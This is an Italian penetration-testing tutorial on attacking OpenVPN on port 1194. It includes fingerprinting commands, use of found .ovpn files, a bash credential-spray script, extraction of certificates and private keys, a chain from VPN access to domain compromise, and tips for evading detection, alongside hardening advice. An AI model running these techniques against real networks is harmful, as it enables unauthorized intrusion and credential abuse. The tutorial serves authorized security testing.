---
title: 'Porta 1194 OpenVPN: File .ovpn, Credenziali VPN e Accesso Interno'
slug: porta-1194-openvpn
description: >-
  Pentest OpenVPN sulla porta 1194: fingerprint UDP/TCP, analisi file .ovpn,
  test credenziali, certificati client e accesso alla rete interna in lab.
image: /porta-1194-openvpn (1).webp
draft: false
date: 2026-04-11T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - OpenVPN
  - OVPN
  - VPN Pentest
---

La porta 1194 è il default di OpenVPN, la VPN open-source più diffusa in ambienti enterprise. Esporre OpenVPN significa esporre il punto di ingresso alla rete interna: credenziali valide o file `.ovpn` con chiavi embedded permettono accesso diretto alla LAN aziendale. In molti scenari, OpenVPN è integrato con LDAP/Active Directory: compromettere la VPN equivale a ottenere accesso al dominio. I file `.ovpn` recuperati da backup, share o host compromessi rappresentano uno dei vettori con impatto più critico in fase di pentest.

**COSA C'È NELLA PORT 1194**

* OpenVPN (1194/UDP) è il gateway alla rete interna — credenziali valide = accesso diretto alla LAN
* File `.ovpn` in backup/share/email possono contenere certificati e chiavi embedded — accesso immediato senza password
* Integrazione con LDAP/AD: credenziali VPN = credenziali dominio — compromissione VPN = compromissione AD

Porta 1194 OpenVPN è il canale [UDP](https://hackita.it/articoli/udp) (o [TCP](https://hackita.it/articoli/tcp)) del tunnel VPN cifrato OpenVPN. La porta 1194 vulnerabilità principali sono le credenziali deboli (spesso backend AD/LDAP), i file di configurazione .ovpn con chiavi embedded trovati in backup e share, e le versioni non aggiornate con CVE note. L'enumerazione porta 1194 è limitata — OpenVPN è progettato per non rispondere a probe non autenticati. Nel pentest, la VPN è un target strategico: l'accesso VPN dà connettività alla rete interna completa.

## 1. Anatomia Tecnica della Porta 1194

| Aspetto        | Dettaglio                                 |
| -------------- | ----------------------------------------- |
| Porta default  | 1194/UDP (può essere TCP)                 |
| Protocollo     | OpenVPN custom su TLS                     |
| Autenticazione | Certificato client, user/pass, o entrambi |
| Cifratura      | AES-256-GCM (default moderno)             |
| Backend auth   | LDAP, RADIUS, PAM, local                  |

Flusso di connessione:

1. Client invia pacchetto OpenVPN iniziale (opcode 0x38 per control hard reset)
2. Server risponde con il proprio hard reset
3. TLS handshake (il client deve presentare un certificato valido se richiesto)
4. Autenticazione username/password (se configurata in aggiunta al certificato)
5. Tunnel stabilito — il client riceve IP dalla rete interna

```
Misconfig: Autenticazione solo con user/pass (senza certificato client)
Impatto: brute force diretto sulle credenziali VPN
Come si verifica: openvpn --config client.ovpn — se chiede solo user/pass, non serve cert
```

```
Misconfig: File .ovpn con certificati e chiavi embedded
Impatto: chiunque trovi il file ha accesso VPN senza alcuna credenziale aggiuntiva
Come si verifica: grep -c "BEGIN CERTIFICATE\|BEGIN PRIVATE KEY" file.ovpn
```

```
Misconfig: Split tunneling disabilitato — il client ha accesso a tutta la rete
Impatto: dalla VPN raggiungi ogni subnet, incluse quelle di management
Come si verifica: route print dopo connessione — se 0.0.0.0/0 va nel tunnel, è full tunnel
```

## 2. Enumerazione Base

### Comando 1: Nmap

```bash
nmap -sU -sV -p 1194 10.10.10.5
```

**Output atteso:**

```
PORT     STATE         SERVICE VERSION
1194/udp open|filtered openvpn
```

**Parametri:**

* `-sU`: scan UDP (OpenVPN default è UDP)
* `open|filtered` è normale — OpenVPN non risponde a probe generici

### Comando 2: Fingerprint con openvpn probe

```bash
# Invia pacchetto OpenVPN hard reset
echo -ne '\x38\x01\x00\x00\x00\x00\x00\x00\x00' | nc -u -w 2 10.10.10.5 1194 | xxd
```

**Output (OpenVPN presente):**

```
00000000: 4001 0000 0000 0000 00                   @........
```

**Output (nessun servizio):**

```
(nessuna risposta)
```

**Lettura dell'output:** il byte `0x40` è l'opcode di risposta OpenVPN (control hard reset server). Conferma OpenVPN attivo.

### Comando 3: Scan TCP (se OpenVPN è su TCP)

```bash
nmap -sV -p 1194,443 10.10.10.5
```

Molti OpenVPN sono configurati su TCP 443 per bypassare firewall restrittivi — sembrando traffico HTTPS.

## 3. Tecniche Offensive

**Connessione con file .ovpn trovato**

Contesto: hai trovato un file .ovpn in un backup, share SMB o email.

```bash
# Verifica se contiene certificato e chiave embedded
grep -c "BEGIN" found_config.ovpn
```

**Output:**

```
4
```

(4 occorrenze = CA cert, client cert, client key, tls-auth — configurazione completa)

```bash
# Connessione diretta
sudo openvpn --config found_config.ovpn
```

**Output (successo):**

```
TUN/TAP device tun0 opened
Initialization Sequence Completed
```

**Cosa fai dopo:** sei sulla rete interna. `ip addr show tun0` rivela l'IP assegnato. Da qui attacca come se fossi fisicamente connesso — [enumerazione AD](https://hackita.it/articoli/active-directory), scan delle subnet, lateral movement.

**Credential brute force su OpenVPN**

Contesto: OpenVPN con auth user/pass. Hai il file .ovpn (senza chiave client, o con chiave ma serve anche la password).

```bash
# Crea file auth con una credenziale per riga
echo -e "admin\nPassword123" > /tmp/auth.txt

# Tentativo di connessione
sudo openvpn --config client.ovpn --auth-user-pass /tmp/auth.txt --connect-timeout 10
```

**Output (successo):**

```
Initialization Sequence Completed
```

**Output (fallimento):**

```
AUTH: Received control message: AUTH_FAILED
```

**Script per spray:**

```bash
#!/bin/bash
while IFS= read -r user; do
  echo -e "$user\nSpring2026!" > /tmp/auth.txt
  timeout 15 sudo openvpn --config client.ovpn --auth-user-pass /tmp/auth.txt \
    --connect-timeout 10 2>&1 | grep -q "Sequence Completed" && echo "VALID: $user"
  sleep 30  # Evita lockout
done < users.txt
```

**Cosa fai dopo:** il brute force è lento (una connessione TLS completa per tentativo). Se il backend è AD/LDAP, testa le stesse credenziali su OWA/SMB prima — è più veloce. Credenziali trovate → connessione VPN → rete interna.

**Estrazione credenziali da file .ovpn**

```bash
# Estrai certificato client
awk '/BEGIN CERTIFICATE/,/END CERTIFICATE/' found_config.ovpn > client_cert.pem

# Estrai chiave privata
awk '/BEGIN PRIVATE KEY/,/END PRIVATE KEY/' found_config.ovpn > client_key.pem

# Estrai server hostname/IP
grep "^remote " found_config.ovpn
```

**Output:**

```
remote vpn.corp.local 1194 udp
```

**Cosa fai dopo:** il certificato client può essere usato per autenticarsi. Il server `vpn.corp.local` conferma il dominio target. Se la chiave privata è protetta da passphrase, cracka con `openssl rsa -in client_key.pem -passin pass:test`.

## 4. Scenari Pratici di Pentest

### Scenario 1: File .ovpn trovato in share/backup

**Situazione:** durante l'enumeration hai trovato un file .ovpn in un share SMB o in un backup rsync.

**Step 1:**

```bash
grep -E "remote|auth-user|cert|key|ca" found.ovpn
```

**Step 2:**

```bash
sudo openvpn --config found.ovpn
# Se chiede user/pass: prova credenziali note dall'engagement
```

**Step 3:**

```bash
# Dopo connessione: enumera la rete
ip route
nmap -sn 10.10.10.0/24
```

**Se fallisce:**

* Causa: certificato revocato (CRL check)
* Fix: il cert potrebbe essere stato revocato — verifica con `openssl verify`

**Tempo stimato:** 2-5 minuti con file completo

### Scenario 2: OpenVPN con backend LDAP/AD

**Situazione:** OpenVPN autentica via LDAP. Hai credenziali AD.

**Step 1:**

```bash
# Usa credenziali AD note
echo -e "j.smith@corp.local\nSpring2026!" > /tmp/auth.txt
sudo openvpn --config corporate.ovpn --auth-user-pass /tmp/auth.txt
```

**Se fallisce:**

* Causa: MFA/2FA configurato (OTP richiesto)
* Fix: OpenVPN + 2FA richiede il codice OTP appendato alla password: `Spring2026!123456`

**Tempo stimato:** 1-5 minuti

### Scenario 3: External pentest — OpenVPN esposto

**Situazione:** la porta 1194 è aperta sull'IP pubblico del cliente.

**Step 1:**

```bash
nmap -sU -p 1194 [target_ip]
echo -ne '\x38\x01\x00\x00\x00\x00\x00\x00\x00' | nc -u -w 2 [target_ip] 1194 | xxd
```

**Step 2:**

```bash
# Senza file .ovpn non puoi connetterti — hai bisogno almeno del CA cert
# Cerca: .ovpn leak in repo GitHub, Pastebin, breach database
# Oppure: social engineering per ottenere il file di configurazione
```

**Se fallisce:**

* Causa: serve il certificato CA e possibilmente il cert client
* Fix: senza il file .ovpn, OpenVPN è difficile da attaccare — concentrati su altri vettori

**Tempo stimato:** 5-15 minuti (fingerprint), variabile (per ottenere .ovpn)

## 5. Attack Chain Completa

| Fase          | Tool         | Comando                             | Risultato          |
| ------------- | ------------ | ----------------------------------- | ------------------ |
| Recon         | nmap         | `nmap -sU -p 1194 [target]`         | OpenVPN confermato |
| Config search | grep/find    | Cerca .ovpn in share, backup, email | File config        |
| Connect       | openvpn      | `openvpn --config found.ovpn`       | Tunnel attivo      |
| Internal scan | nmap         | `nmap -sn [internal_subnet]`        | Host interni       |
| AD attack     | cme/impacket | `crackmapexec smb [DC]`             | Domain compromise  |

## 6. Detection & Evasion

### Blue Team

* **VPN log**: connessioni, IP sorgente, durata sessione, utente
* **SIEM**: login VPN da geo-localizzazioni anomale, orari insoliti
* **NAC**: verifica compliance del client (patch level, AV)

### Evasion

```
Tecnica: Connessione in orari lavorativi
Come: connettiti quando gli utenti legittimi usano la VPN
Riduzione rumore: il tuo login si confonde con quelli normali
```

```
Tecnica: OpenVPN su TCP 443
Come: molti server accettano anche TCP 443 — sembra traffico HTTPS
Riduzione rumore: indistinguibile da navigazione web
```

## 7. Cheat Sheet Finale

| Azione            | Comando                                                     |
| ----------------- | ----------------------------------------------------------- |
| Scan UDP          | `nmap -sU -p 1194 [target]`                                 |
| Scan TCP          | `nmap -sV -p 1194,443 [target]`                             |
| Fingerprint       | `echo -ne '\x38\x01...' \| nc -u -w 2 [target] 1194 \| xxd` |
| Check .ovpn       | `grep -c "BEGIN" file.ovpn`                                 |
| Connect           | `sudo openvpn --config file.ovpn`                           |
| Connect w/ creds  | `sudo openvpn --config file.ovpn --auth-user-pass auth.txt` |
| Extract cert      | `awk '/BEGIN CERT/,/END CERT/' file.ovpn`                   |
| Post-connect scan | `ip route && nmap -sn [subnet]`                             |

### Perché Porta 1194 è rilevante nel 2026

OpenVPN resta la VPN open-source più usata in enterprise. L'accesso VPN è il singolo vettore che trasforma un external pentest in un internal. File .ovpn con chiavi embedded sono il finding più cercato durante l'enumerazione. Le credenziali VPN con backend AD compromettono sia la VPN che il dominio.

### Hardening

* Autenticazione: certificato client + user/pass + 2FA/OTP
* Revoca certificati compromessi immediatamente (CRL/OCSP)
* Non usare chiavi embedded nei file .ovpn — usa riferimenti a file separati
* Split tunneling: limita le subnet raggiungibili via VPN
* Log e monitoring: alert su login anomali

***

Riferimento: OpenVPN documentation, RFC 5246 (TLS). Uso esclusivo in ambienti autorizzati. [https://it.wikipedia.org/wiki/OpenVPN](https://it.wikipedia.org/wiki/OpenVPN)

> [hackita.it/supporto](https://hackita.it/supporto) — [hackita.it/servizi](https://hackita.it/servizi).
